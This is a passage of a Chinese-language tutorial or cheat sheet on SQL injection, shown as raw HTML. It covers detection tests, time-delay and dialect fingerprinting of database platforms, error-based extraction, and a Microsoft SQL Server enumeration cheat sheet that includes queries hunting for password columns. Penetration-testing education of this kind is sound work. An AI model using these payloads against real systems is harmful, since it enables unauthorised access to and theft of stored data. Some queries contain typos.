当处理字符串数据时，可以采用与评估数值参数类似的方法。与前面的例子一样，第一步是从应用程序获取有效的值，并确定当改变该值时服务器的响应也一致地产生差异。在本例中，我们假定下面的请求参数值将产生不同的结果：&lt;br&gt;&lt;a href=&#34;http://target/products.asp?catagory=shoes&#34;&gt;http://target/products.asp?catagory=shoes&lt;/a&gt;&lt;br&gt;&lt;a href=&#34;http://target/products.asp?catagory=blahfoo&#34;&gt;http://target/products.asp?catagory=blahfoo&lt;/a&gt;&lt;br&gt;在测试字符串数据时，一种常用的策略是将字符串拆分为两个或多个子串，然后再使用SQL语法在服务器端将这些子串连接起来。一个重要的附加说明是：对于字符串的连接，需要根据数据库平台的不同采用不同的连接语法。由于我们可能事先知道是哪一种数据库服务器， 因此典型的办法是一开始就使用目标平台的字符串连接语法，比如  Microsoft SQL Server、Oracle 或 MySQL。下列 URL 实现了再造参数值”shoes”的字符串连接： &lt;br&gt;Microsoft  SQL Server  &lt;a href=&#34;http://target/products.asp?catagory=sho%27+%27es(+%E6%98%AF+%E5%8F%B7%E7%9A%84URL%E7%BC%96%E7%A0%81)&#34;&gt;http://target/products.asp?catagory=sho&#39;%2b&#39;es(%2b是+号的URL编码)&lt;/a&gt;&lt;br&gt;Oracle 或 PostgreSQL  &lt;a href=&#34;http://target/products.asp?catagory=sho%27%7C%7C%27es&#34;&gt;http://target/products.asp?catagory=sho&#39;||&#39;es&lt;/a&gt; &lt;br&gt;MySQL  &lt;a href=&#34;http://target/products.asp?catagory=sho%27%20%27es&#34;&gt;http://target/products.asp?catagory=sho&#39;%20&#39;es&lt;/a&gt;  (%20是空格字符的URL编码)改变连接操作符两侧的子串将使输入无效，并取回与其他任意随机字符串一致的结果。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;在服务器的响应中，SQL条件表达式的附加部分是否产生一致 的差异性？&lt;/td&gt;
&lt;td&gt;从统计角度讲，大多数SQL注入漏洞都发生在这样的情况下：当用户提供的数据被不安全地包含在操作数中，并被传递给WHERE子句时。 在下面的例子中，请注意URL和产生的SQL査询：  &lt;br&gt;URL: &lt;a href=&#34;http://targetserver/news.php?id=100&#34;&gt;http://targetserver/news.php?id=100&lt;/a&gt;  &lt;br&gt;SQL: SELECT * FROM news WHERE article_id=100 &lt;br&gt;在正常的操作下，上面这个例子将取回并显示article_id值等于100的新闻文章。但是，如果参数id容易受到SQL注入&amp;amp;击，那么下面的请求将产生不同的结果：&lt;br&gt;URL 1: &lt;a href=&#34;http://targetserver/news.php?id=100&#34;&gt;http://targetserver/news.php?id=100&lt;/a&gt; and 1=1  URL 2: &lt;a href=&#34;http://targetserver/news.php?id=100&#34;&gt;http://targetserver/news.php?id=100&lt;/a&gt; and 1=2  &lt;br&gt;通过添加”and 1=1”，在页面上应该看不到改变，因为从逻辑上来讲，该表达式并未改变WHERE子句的输出： &lt;br&gt; SELECT * FROM news WHERE article_id=100 and 1=1 相反，添加”and 1=2”意味着WHERE子句并不匹配数据库中的任何记录：&lt;br&gt;SELECT * FROM news WHERE article_id=100 and 1=2 通过使用这种技术操纵服务器的响应，我们常常可以识别SQL注入漏洞的存在。在某些情况下，可能需要通过关闭圆括号或者打破引号界定的数据，以便使用这种技术。例如，可以使用下面一系列的表达式：  &lt;br&gt;‘AND  ‘a’=’a Vs    ‘AND ‘a’=’b’  AND  1=1-Vs     ‘AND 1=2–  ) AND 1=1– Vs    ) AND 1=1–  ‘) AND 1=1-Vs     ‘) AND 1=2–&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;是否有可能触发可度量的时间 延迟？&lt;/td&gt;
&lt;td&gt;通过SQL注入触发可度量的时间延迟，既可以用来确认是否存在缺陷， 在绝大多数情况下也可以用来识别后台数据库。&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;h4 id=&#34;识别数据库平台&#34;&gt;&lt;a href=&#34;#识别数据库平台&#34; class=&#34;headerlink&#34; title=&#34;识别数据库平台&#34;&gt;&lt;/a&gt;识别数据库平台&lt;/h4&gt;&lt;ol&gt;
&lt;li&gt;通过时间延迟推理识别数据库平台&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;产生时间延迟&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;&lt;/th&gt;
&lt;th&gt;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;平台&lt;/td&gt;
&lt;td&gt;时间延迟&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Microsoft SQL Server&lt;/td&gt;
&lt;td&gt;&lt;code&gt;WAITFOR DELAY 0:0:10&#39;  &lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Oracle&lt;/td&gt;
&lt;td&gt;&lt;code&gt;BEGIN DBMS LOCK.SLEEP(5);END;-- (仅PL/SQL注入)&lt;/code&gt;&lt;br&gt;&lt;code&gt;SELECT UTL_INADDR.get_host_name(&#39;192.168.0.1&#39;) FROM dual &lt;/code&gt;&lt;br&gt;&lt;code&gt;SELECT UTL_INADDR.get_host_address(&#39;foo.nowhere999.zom&#39;）FROM dual &lt;/code&gt;&lt;br&gt;SELECT UTL_HTTP.REOUEST(‘&lt;a href=&#34;http://www.oracle.com/&#34;&gt;http://www.oracle.com&lt;/a&gt;‘) FROM dual&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;MySQL&lt;/td&gt;
&lt;td&gt;&lt;code&gt;BENCHMARK(1000000,MD5(&#34;HACK&#34;)) -- 低于5.0.12版本&lt;/code&gt;  &lt;code&gt;SLEEP(10)-- 5.0.12 及更高版本&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;PostgreSQL&lt;/td&gt;
&lt;td&gt;&lt;code&gt;SELECT pg_sleep(10);-- 8.2 及更高版本&lt;/code&gt; &lt;br&gt; &lt;code&gt;CREATE OR REPLACE FUNCTION  pg_sleep(int) RETURNS int AS &#39;/lib/libc.so.6&#39;,&#39;sleep&#39; language &#39;C&#39;  STRICT;-- 在Linux上创建 pg_sleep 函数，要求 postgres/pgsql 级别的权限&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;通过SQL方言推理识别数据库平台&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;SQL方言差异&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;平   台&lt;/th&gt;
&lt;th&gt;连接符&lt;/th&gt;
&lt;th&gt;行注释&lt;/th&gt;
&lt;th&gt;唯一的默认表、变量或函数&lt;/th&gt;
&lt;th&gt;Int转char函数&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;Microsoft SQL Server&lt;/td&gt;
&lt;td&gt;‘A’+’B’&lt;/td&gt;
&lt;td&gt;–&lt;/td&gt;
&lt;td&gt;&lt;code&gt;@@PACK_RECEIVED&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;code&gt;char(0*41)&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Oracle&lt;/td&gt;
&lt;td&gt;‘A’||’B’ concat(‘A’,’B’)&lt;/td&gt;
&lt;td&gt;–&lt;/td&gt;
&lt;td&gt;&lt;code&gt;BITAND(1,1)&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;code&gt;chr(65)&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;MySQL&lt;/td&gt;
&lt;td&gt;concat(‘A’,’B’)  ‘A’ ‘B’&lt;/td&gt;
&lt;td&gt;#&lt;/td&gt;
&lt;td&gt;&lt;code&gt;CONNECTION_ID()&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;code&gt;char(0x41)&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Access&lt;/td&gt;
&lt;td&gt;“A” &amp;amp; “B”&lt;/td&gt;
&lt;td&gt;N/A&lt;/td&gt;
&lt;td&gt;&lt;code&gt;msysobjects&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;code&gt;chr(65)&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;PostgreSQL&lt;/td&gt;
&lt;td&gt;‘A’||’B’&lt;/td&gt;
&lt;td&gt;–&lt;/td&gt;
&lt;td&gt;&lt;code&gt;getpgusemame()  &lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;code&gt; chr(65)&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;DB2&lt;/td&gt;
&lt;td&gt;‘a’ concat ‘b’&lt;/td&gt;
&lt;td&gt;–&lt;/td&gt;
&lt;td&gt;&lt;code&gt;sysibm.systables&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;code&gt;chr(65)&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;#Microsoft SQL Server&lt;/span&gt;
&lt;span class=&#34;token string&#34;&gt;&#39;AND @@PACK_RECEIVED = @@PACK_RECEIVED -- 
&#39;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;#MySQL&lt;/span&gt;
&lt;span class=&#34;token string&#34;&gt;&#39;AND CONNECTION_ID() = CONNECTION_ID()-- 
&#39;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;#Oracle&lt;/span&gt;
&lt;span class=&#34;token string&#34;&gt;&#39;AND BITAND(1,1) = BITAND(1,1)-- 
&#39;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;#PostgreSQL&lt;/span&gt;
&#39;&lt;span class=&#34;token operator&#34;&gt;AND&lt;/span&gt; getpgusername&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; getpgusername&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;-- &lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;通过错误消息提取数据&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;#Microsoft SQL Server&lt;/span&gt;
&lt;span class=&#34;token operator&#34;&gt;AND&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;Aversion&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;-- &lt;/span&gt;
&lt;span class=&#34;token operator&#34;&gt;AND&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;CONVERT&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;INT&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; @&lt;span class=&#34;token variable&#34;&gt;@VERSION&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;-- &lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;#MySQL&lt;/span&gt;
&lt;span class=&#34;token operator&#34;&gt;AND&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;count&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;concat&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; VERSION&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;floor&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;rand&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;x &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; information_schema&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;tables&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;group&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;by&lt;/span&gt; x&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;a&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;#&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;#Oracle&lt;/span&gt;
&lt;span class=&#34;token operator&#34;&gt;AND&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;utl_inaddr&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;get_host_name&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; banner &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; v$version &lt;span class=&#34;token keyword&#34;&gt;WHERE&lt;/span&gt; rownum&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;-- &lt;/span&gt;
&lt;span class=&#34;token operator&#34;&gt;AND&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;CTXSYS&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;DRITHSX&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;SN&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; banner &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; v$version &lt;span class=&#34;token keyword&#34;&gt;WHERE&lt;/span&gt; rownum&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;-- &lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;#PostgreSQL&lt;/span&gt;
&lt;span class=&#34;token operator&#34;&gt;AND&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;CAST&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; version&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;::&lt;span class=&#34;token keyword&#34;&gt;text&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;AS&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;NUMERIC&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;-- &lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;将多行合并为单行&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;使用SQL合并多行  &lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;平   台&lt;/th&gt;
&lt;th&gt;合并多行和（或）列的查询&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;Microsoft SQL  Server&lt;/td&gt;
&lt;td&gt;&lt;code&gt;BEGIN DECLARE @x varchar (8000) SET @x=&#39; &#39;  SELECT @x=@x+&#39;/&#39;+name FROM sysobjects WHERE name&amp;gt;&#39;a&#39; ORDER BY name END; SELECT @x AS DATA INTO foo&lt;/code&gt; &lt;br&gt;&lt;code&gt;-- populates the @x variable with all &#34;name&#34;column values from sysobjects table. Data from the @x variable is the stored in a table named foo under a column named data&lt;/code&gt; &lt;code&gt;BEGIN DECLARE @x varchar(8000) SET @x=&#39; &#39;  SELECT @x=@x+&#39;/&#39;+name FROM sysobjects WHERE name&amp;gt;&#39;a&#39; ORDER BY name; SELECT 1 WHERE 1 IN (SELECT @x) END;&lt;/code&gt;&lt;br&gt;&lt;code&gt;-- As above but displays results with the sQL server error message&lt;/code&gt;&lt;br&gt; &lt;code&gt;SELECT name FROM sysobjects FOR XML RAW&lt;/code&gt;&lt;br&gt;&lt;code&gt;-- returns the resultset as a single XML formatted string&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Oracle&lt;/td&gt;
&lt;td&gt;`SELECT sys.stragg(distinct username&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;MySQL&lt;/td&gt;
&lt;td&gt;&lt;code&gt;SELECT GROUP_CONCAT(user) FROM mysql.user;&lt;/code&gt; &lt;br&gt;&lt;code&gt;--Returns a comma separated list of  users.  &lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;PostgreSQL&lt;/td&gt;
&lt;td&gt;&lt;code&gt;SELECT array_to_string(array(SELECT  datname FROM pg_database), &#39;:&#39;);&lt;/code&gt; &lt;code&gt;-- Returns a colon seperated list of database names &lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;h4 id=&#34;Microsoft-SQL-Server-备忘单&#34;&gt;&lt;a href=&#34;#Microsoft-SQL-Server-备忘单&#34; class=&#34;headerlink&#34; title=&#34;Microsoft SQL Server 备忘单&#34;&gt;&lt;/a&gt;Microsoft SQL Server 备忘单&lt;/h4&gt;&lt;ol&gt;
&lt;li&gt;枚举数据库配置信息和模式&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;提取Microsoft SQL Server的配置信息&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;数   据&lt;/th&gt;
&lt;th&gt;查  询&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;版本&lt;/td&gt;
&lt;td&gt;&lt;code&gt;SELECT @@version;&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;当前用户&lt;/td&gt;
&lt;td&gt;&lt;code&gt;SELECT system user;&lt;/code&gt;&lt;br&gt;&lt;code&gt;SELECT suser_sname();&lt;/code&gt;&lt;br&gt;&lt;code&gt; SELECT user;&lt;/code&gt;&lt;br&gt;&lt;code&gt; SELECT loginame FROM master..sysprocesses WHERE spid =@@SPID;&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;列出用户&lt;/td&gt;
&lt;td&gt;&lt;code&gt;SELECT name FROM master..syslogins;  &lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;当前用户权限，如果用户为sysadmin，返回1;如果用户不具有sysadmin权限，返回0&lt;/td&gt;
&lt;td&gt;&lt;code&gt;SELECT is_srvolemenber(&#39;sysadmin&#39;);  &lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;数据库服务器主机名&lt;/td&gt;
&lt;td&gt;&lt;code&gt;SELECT  @@ servername;&lt;/code&gt;&lt;br&gt;&lt;code&gt;SELECT  SERVEROROPERTY(&#39;productversion&#39;), SERVERPROPERTY(&#39;productlevel&#39;),SERVERPROPERTY(&#39;edition&#39;);  -- 仅 SQL  Server 2005&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;p&gt;提取Microsoft SQL Server的模式信息&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;数   据&lt;/th&gt;
&lt;th&gt;查   询&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;当前数据库&lt;/td&gt;
&lt;td&gt;&lt;code&gt;SELECT DB_NAME();&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;列出数据库&lt;/td&gt;
&lt;td&gt;&lt;code&gt;SELECT name FROM master..sysdatabases;&lt;/code&gt;&lt;br&gt;  &lt;code&gt;SELECT DB NAME(N);&lt;/code&gt;&lt;br&gt;&lt;code&gt;-- Where N is the database number &lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;列出表&lt;/td&gt;
&lt;td&gt;当前数据库中的表：&lt;br&gt;&lt;code&gt;SELECT name FROM sysobjects WHERE xtype=&#39;u&#39;;&lt;/code&gt;&lt;br&gt;&lt;code&gt;SELECT name FROM sysobjects WHERE xtype=&#39;V&#39;;--视图&lt;/code&gt;&lt;br&gt;master数据库中的表：&lt;br&gt;&lt;code&gt;SELECT name FROM master..sysobjects WHERE xtype=&#39;U&#39;;&lt;/code&gt;&lt;br&gt;&lt;code&gt;SELECT name FROM master..sysobjects WHERE xtype=&#39;V&#39;;&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;列出列&lt;/td&gt;
&lt;td&gt;当前数据库中tblUsers表的列名：&lt;br&gt;&lt;code&gt;SELECT name FROM syscolumns WHERE id=object_id(&#39;tblUsers&#39;);&lt;/code&gt;&lt;br&gt;admin数据库中tblUsers表的列名：&lt;br&gt;&lt;code&gt;SELECT name FROM admin..syscolumns WHERE id=object_id(&#39;admin..tblmembers&#39;);&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;査找具有指定名称的列&lt;/td&gt;
&lt;td&gt;查找指定的name &lt;br&gt;&lt;code&gt;drop table pentest；begin declare@ret varchar(8000) set @ret=CHAR(58) select @ret=@ret+CHAR(32)+o.name+ CHAR(47)+c.name from syscolumns c,sysobjects o where c.name LIKE &#39;%XXX%&#39; and c.id=o.id and o.type=&#39;U&#39; select @ret as ret into pentest end-&lt;/code&gt;&lt;br&gt;URL编码&lt;br&gt;查找名称中包含Pass的列名&lt;br&gt;&lt;code&gt;drop table pentest;begin declare @ret varchar(8000) set @ret=CHAR(58) select @ret=@ret+CHAR(32)+o.name+CHAR(47)+c.name from syscolumns c,sysobjects o where (c.name LIKE&#39;%[Pp][Aa][Ss][Ss]%&#39; or c.name LIKE&#39;%[Pp][Ww][Dd]%&#39;) and c.id=o.id and o.type=&#39;U&#39; select @ret as ret into pentest end-&lt;/code&gt;&lt;br&gt;URL编码&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;在列中查找特定的值&lt;/td&gt;
&lt;td&gt;对于指定的搜索字符串，返回数据库和列的名称，并将数据存储在foo数据库中&lt;code&gt;Drop table #Results;Drop table foo;CREATE TABLE #Results(ColumnName nvarchar(370),ColumnValue nvarchar(3630);SET NOCOUNT ON;DECLARE @TableName nvarchar(256),@columnNamenvarchar(128), @Searchstr2 nvarchar(110) SET @TableName = &#39;&#39;; SET @searchstr2 = QUOTENAME(&#39;%&#39;+&#39;dave&#39;+&#39;%&#39;,&#39;&#39;&#39;&#39;); WHILE @TableName IS NOT NULL BEGIN SET @columnName = &#39;&#39;; SET @TableName =(SELECT MIN (QUOTENAME(TABLE_SCHEMA) + &#39;.&#39; + QUOTENAME(TABLE_NAME)) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = &#39;BASE_TABLE&#39; AND OUOTENAME (TABLE_SCHEMA) + &#39;.&#39; + QUOTENAME(TABLE_NAME) &amp;gt; @rableName AND OBJECTPROPERTY (OBJECT_ID(QUOTENAME(TABLE_SCHEMA)+ QUOTENAME(TABLE_NAME)),&#39;IsMSShipped&#39;) = 0); WHILE (@TableName IS NOT NULL) AND (@ColumnName IS NOT NULL) BEGIN SET @ColumnName =(SELECT MIN (QUOTENAME(COLUMN_NAME)) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA PARSENAME (@TableName, 2) AND TABLE_NAME = PARSENAME(@TableName, 1) AND DATA_TYPE IN (&#39;char&#39;, &#39;varchar&#39;, &#39;nchar&#39;,&#39;nvarchar&#39;) AND QUOTENAME (COLUMN_NAME) &amp;gt; @columnName); IF @ColumnName IS NOT NULL BEGIN INSERT INTO #Results EXEC(&#39;SELECT &#39;&#39;&#39;+@rableName +&#39;.&#39;+@columnName+&#39;&#39;&#39;,LEFT(&#39;+@columnName +&#39;, 3630) FROM&#39;+ @rableName+&#39;(NOLOCK)+&#39;WHERE&#39; + @columnName + &#39;LIKE&#39;+@Searchstr2); END END END select ColumnName, ColumnValue into foo FROM # Results&lt;/code&gt;&lt;br&gt;URL编码&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;SQL 盲注函数：Microsoft SQL Server&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;SQL盲注函数&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;数   据&lt;/th&gt;
&lt;th&gt;查  询&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
